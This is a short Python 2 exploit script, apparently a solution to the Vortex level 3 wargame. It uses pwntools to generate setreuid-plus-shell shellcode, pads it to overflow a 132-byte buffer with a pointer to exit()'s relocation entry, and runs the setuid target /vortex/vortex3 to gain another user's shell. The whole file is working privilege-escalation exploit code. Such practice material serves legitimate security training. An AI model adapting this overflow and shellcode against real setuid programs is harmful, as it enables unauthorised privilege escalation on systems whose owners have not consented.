#!/usr/bin/env python2

import os
import re
import pwd
import struct
import subprocess
import pwn


def expl0it():
    '''
    exploit the target vulnerable process

    return (int: 1) on success and (int: 0) on failure
    '''

    try:
        vortex4_uid = pwd.getpwnam('vortex4').pw_uid
    except KeyError:
        print 'user vortex4 does not exist'
        return 0

    pwn.context(arch='i386', os='linux')

    print 'generating shellcode...',

    shellcode = pwn.asm(
        pwn.shellcraft.setreuid(vortex4_uid) + pwn.shellcraft.sh())

    '''
    @[0x80482a4]:
        - the virtual address of the (r_offset) field in the dynamic relocation
          table entry for glibc's exit()
    '''
    ptr2exitgotslot = struct.pack("<I", 0x80482a4)

    # 132 = sizeof(vulnerable buffer) + sizeof(the pointer named tmp)
    expegg = shellcode + '\x41' * (132 - len(shellcode)) + ptr2exitgotslot

    print '[done]'
    print 'trying to expl0it the vulnerable process'

    exit_stat = subprocess.call(['/vortex/vortex3', expegg])
    
    return 0 if exit_stat != os.EX_OK else 1
        


if __name__ == '__main__':
    expl0it_success = expl0it()
    if not expl0it_success:
        print 'failed to expl0it the target vulnerable process'
